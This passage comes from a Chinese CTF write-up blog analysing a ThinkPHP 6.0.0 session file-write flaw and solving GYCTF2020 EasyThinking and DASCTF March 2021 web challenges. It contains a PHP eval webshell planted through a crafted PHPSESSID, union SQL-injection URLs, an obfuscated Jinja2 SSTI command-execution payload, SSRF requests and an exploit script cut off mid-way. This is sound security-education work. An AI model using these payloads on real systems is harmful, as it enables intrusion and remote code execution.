class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>vendor/topthink/framework/src/think/session/Store.php</p><p>调用了<code>write()</code>方法，<code>$sessionId</code>等于<code>$this-&gt;id</code></p><p><img src="https://www.hualigs.cn/image/607146a33cc87.jpg"></p><p><img src="https://www.hualigs.cn/image/607146a87f1fe.jpg"></p><p>vendor/topthink/framework/src/think/session/driver/File.php</p><p>跟进<code>write()</code>方法，写入文件名为经过<code>getFileName()</code>处理的<code>$sessID</code>，写入文件内容为传入的参数<code>$sessData</code></p><p><img src="https://www.hualigs.cn/image/607146a28d9ef.jpg"></p><p>跟进<code>getFileName()</code>，文件名实质上就等于<code>sess_</code>拼接上<code>$this-&gt;id</code></p><p><img src="https://www.hualigs.cn/image/607146a314092.jpg"></p><p><code>writeFile()</code>方法调用了file_put_contents()写入文件，写入的文件名等于<code>sess_</code>拼接上<code>$this-&gt;id</code></p><p><img src="https://www.hualigs.cn/image/607146a31e76e.jpg"></p><p>接着查找<code>$this-&gt;id</code>的来源，当传入的参数$id长度等于32位时返回<code>$this-&gt;id</code>等于<code>$id</code>。</p><p><img src="https://www.hualigs.cn/image/607146a41f03a.jpg"></p><p>vendor/topthink/framework/src/think/middleware/SessionInit.php</p><p>这里调用了<code>setId()</code>方法，$cookName等于PHPSESID， <code>$this-&gt;$id</code> 最终来源于cookie中的 <code>PHPSESSID</code> 。这样写入的文件名就可控了。文件内容<code>data</code>来源于session的内容，需要代码中存在可以控制session内容的操作，如<code>Session::set(&#39;name&#39;,$_POST[&#39;c&#39;]);</code>，就可以写入shell。</p><p><img src="https://www.hualigs.cn/image/607146aba283e.jpg"></p><p>vendor/topthink/framework/src/think/session/Store.php</p><p><img src="https://www.hualigs.cn/image/607146a4916e6.jpg"></p><p><img src="https://www.hualigs.cn/image/607146a4ef622.jpg"></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>vendor/topthink/framework/src/think/session/Store.php</p><p>要触发<code>delete()</code>方法必须要使<code>$this-&gt;data</code>为空，即session中的变量键值为空</p><p><img src="https://www.hualigs.cn/image/607146a33cc87.jpg"></p><p>vendor/topthink/framework/src/think/session/driver/File.php</p><p>delete()方法中的文件名拼接上了sess_，文件名不完全可控，在windows下才可以用一个不存在的目录绕过限制删除任意文件。</p><p><img src="https://www.hualigs.cn/image/607146a9d0e64.jpg"></p><p><img src="https://www.hualigs.cn/image/607146a314092.jpg"></p><h1 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h1><p>通过错误信息得到thinkphp版本为6.0.0</p><p><img src="https://www.hualigs.cn/image/607146a9c41b3.jpg"></p><p>存在<a href="http://www.zip/">www.zip</a></p><p><img src="https://www.hualigs.cn/image/607146a90a25a.jpg"></p><p>\app\middleware.php</p><p>session开启</p><p><img src="https://www.hualigs.cn/image/60714743b1aaa.jpg"></p><p>\app\home\controller\Member.php</p><p>在search控制器下出现了创建session操作，session键值key通过post传参，内容可控</p><p><img src="https://www.hualigs.cn/image/607146af6b105.jpg"></p><p>注册一个用户</p><p><img src="https://www.hualigs.cn/image/607146ae5a420.jpg"></p><p>登陆，修改修改PHPSESSID为aaaabbbbccccddddeeeeffff1234.php</p><p><img src="https://www.hualigs.cn/image/607146ad52377.jpg"></p><p>写入shell，key=<code>&lt;?php eval($_POST[1]);?&gt;</code></p><p><img src="https://www.hualigs.cn/image/607146a99aef8.jpg"></p><p><img src="https://www.hualigs.cn/image/607146b00fce8.jpg"></p><p>成功写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;70366b0f-3c41-4ddb-8e92-2f4fae6b1b2e.node3.buuoj.cn&#x2F;runtime&#x2F;session&#x2F;sess_aaaabbbbccccddddeeeeffff1234.php</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607146b09f419.jpg"></p><p>蚁剑连接后发现flag为空，根目录存在readflag文件，需要执行readflag</p><p><img src="https://www.hualigs.cn/image/607146b004f5f.jpg"></p><p>发现disable_function过滤命令执行函数</p><p><img src="https://www.hualigs.cn/image/607146ace2ccf.jpg"></p><p>使用蚁剑绕过disable_function插件读取flag</p><p><img src="https://www.hualigs.cn/image/607149d41c4f8.jpg"></p><p>参考</p><p><a href="http://hed9eh0g.top/?p=280">http://hed9eh0g.top/?p=280</a></p><p><a href="https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/">https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/</a></p><p><a href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p><p><a href="https://xz.aliyun.com/t/8546">https://xz.aliyun.com/t/8546</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2021 DASCTF三月赛web总结</title>
    <link href="/2021/04/08/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9Bweb%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/08/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9Bweb%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a>BestDB</h1><p>union注入</p><p>开始就提示了sql语句，单引号和空格被过滤，双引号闭合即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; &#39;$query&#39; OR username &#x3D; \&quot;$query\&quot;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/cx91B7bO8SjqKYJ.png" alt="image-20210406122623737.png"></p><p>读取表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/YIagPrL1ysVqfHd.png" alt="image-20210406122601658.png"></p><p>读取列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;),3%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/e7LIlZFmbTM6XtY.png" alt="image-20210406122733420.png"></p><p>读取f1agdas，得知flag在flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd%22&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(f1agdas)&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas),3%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/CZ3cdwuoJ8aHbh5.png" alt="image-20210406123644931.png"></p><p>使用load_File读取文件，flag.txt被过滤，改为hex编码即可绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;hex(load_file(0x2F666C61672E747874))),3%23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/cm2gwbz6ltQ3M5x.png" alt="image-20210406123147212.png"></p><p>解码后得到flag，DASCTF{352f1504696639a0d71c2d36591d505b}</p><p><img src="https://i.loli.net/2021/04/08/nMZIXqO9zm2Kobh.png" alt="image-20210406123303737.png"></p><h1 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h1><p>ssti，源码中给出了黑名单，可以使用join过滤器和unicode数字绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">Hi young boy!&lt;&#x2F;br&gt;</span><br><span class="line">Do you like ssti?&lt;&#x2F;br&gt;</span><br><span class="line"></span><br><span class="line">blacklist&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;&#x2F;br&gt;    </span><br><span class="line">&lt;&#x2F;br&gt;   </span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125; # pop</span><br><span class="line">&#123;%set b&#x3D;lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _</span><br><span class="line">&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125; # globals</span><br><span class="line">&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125; # getitem</span><br><span class="line">&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125; # os</span><br><span class="line">&#123;%set f&#x3D;lipsum|string|list|attr(a)(𝟡)%&#125; # 空格</span><br><span class="line">&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125; # 斜杠</span><br><span class="line">&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125; # cat &#x2F;flag</span><br><span class="line">&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125; # popen</span><br><span class="line">&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125; # read</span><br><span class="line">&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125; #点</span><br><span class="line">&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125; #ls &#x2F;var&#x2F;www&#x2F;flask</span><br><span class="line">&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br><span class="line">#最后拼接起来</span><br><span class="line">#&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;var&#x2F;www&#x2F;flask&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set b&#x3D;lipsum|string|list|attr(a)(𝟙𝟠)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;%set f&#x3D;lipsum|string|list|attr(a)(𝟡)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125;&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125;&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125;&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125;&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125;&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125;&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/y2qaIMUh7VASDQc.png" alt="image-20210408130137429.png"></p><h1 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h1><p>index.php，开始的session可以使用session.upload_progress绕过</p><p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p><p><img src="https://i.loli.net/2021/04/08/A4FQCeun9IYcKJT.png" alt="image-20210406214427556.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no session&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(check_inner_ip(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your IP is internal yoyoyo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现目录下存在admin.php，必须要本地访问</p><p><img src="https://i.loli.net/2021/04/08/SKuT3lwEdmsrbyq.png" alt="image-20210406214347962.png"></p><p>构造ssrf请求admin.php</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10015/?url=http://localhost/admin.php&quot;</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">resp = session.post(url,data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;,files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/08/ux6jz81kNdUnWyA.png" alt="image-20210406214205226.png"></p><p>发现两个文件login_admin.php，/yuanma_f0r_eAZy_logon.zip</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Admin Login&lt;/title&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;application/x-javascript&quot;</span>&gt; addEventListener(<span class="string">&quot;load&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; setTimeout(hideURLbar, <span class="number">0</span>); &#125;, <span class="literal">false</span>); <span class="function"><span class="keyword">function</span> <span class="title">hideURLbar</span>(<span class="params"></span>)</span>&#123; window.scrollTo(<span class="number">0</span>,<span class="number">1</span>); &#125; &lt;/script&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;Flat Dark Web Login Form Responsive Templates, Iphone Widget Template, Smartphone login forms,Login form, Widget Template, Responsive Templates, a Ipad 404 Templates, Flat Responsive Templates&quot;</span> /&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">&lt;!--/yuanma_f0r_eAZy_logon.zip--&gt;</span><br><span class="line">&lt;!--webfonts--&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;http://fonts.useso.com/css?family=PT+Sans:400,700,400italic,700italic|Oswald:400,300,700&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;http://fonts.useso.com/css?family=Exo+2&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;!--<span class="comment">//webfonts--&gt;</span></span><br><span class="line">&lt;script src=<span class="string">&quot;http://ajax.useso.com/ajax/libs/jquery/1.11.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;$(document).ready(<span class="function"><span class="keyword">function</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">$(<span class="string">&quot;.close&quot;</span>).on(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">$(<span class="string">&quot;.login-form&quot;</span>).fadeOut(<span class="string">&quot;slow&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">  $(<span class="string">&quot;.login-form&quot;</span>).remove();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);  </span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> &lt;!--SIGN UP--&gt;</span><br><span class="line"> &lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="line">&lt;div class=&quot;login-form&quot;&gt;</span><br><span class="line">&lt;div class=&quot;close&quot;&gt; &lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;head-info&quot;&gt;</span><br><span class="line">&lt;label class=&quot;lbl-1&quot;&gt; &lt;/label&gt;</span><br><span class="line">&lt;label class=&quot;lbl-2&quot;&gt; &lt;/label&gt;</span><br><span class="line">&lt;label class=&quot;lbl-3&quot;&gt; &lt;/label&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;clear&quot;&gt; &lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;avtar&quot;&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;images/avtar1.png&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;./login_admin.php&quot;</span>&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; class=&quot;text&quot; name=&quot;username&quot; value=&quot;Username&quot; onfocus=&quot;this.value = &quot;&quot;;&quot; onblur=&quot;if (this.value == &quot;&quot;) &#123;this.value = &quot;Username&quot;;&#125;&quot; &gt;</span><br><span class="line">&lt;div class=&quot;key&quot;&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;Password&quot;</span> name=<span class="string">&quot;password&quot;</span> onfocus=<span class="string">&quot;this.value = &quot;</span><span class="string">&quot;;&quot;</span> onblur=<span class="string">&quot;if (this.value == &quot;</span><span class="string">&quot;) &#123;this.value = &quot;</span>Password<span class="string">&quot;;&#125;&quot;</span>&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;div class=&quot;signin&quot;&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Login&quot;</span> &gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"> &lt;div class=&quot;copy-rights&quot;&gt;</span><br><span class="line">&lt;p&gt;Copyright &amp;copy; ez login aha?&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>yuanma_f0r_eAZy_logon.zip中包含一个se1f_Log3n.php</p><p><img src="https://i.loli.net/2021/04/08/z1fsyGHLReTZSup.png" alt="image-20210406214240038.png"></p><p>se1lf_Log3n.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; and `password`=&quot;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc() <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>)) <span class="keyword">OR</span> ( (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>) )); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在布尔盲注，构造注入语句后用ssrf请求即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10015&#x2F;?url&#x3D;http:&#x2F;&#x2F;localhost&#x2F;&#x2F;se1f_Log3n.php?username&#x3D;admin&#39;or 1&#x3D;1%23password&#x3D;admin</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 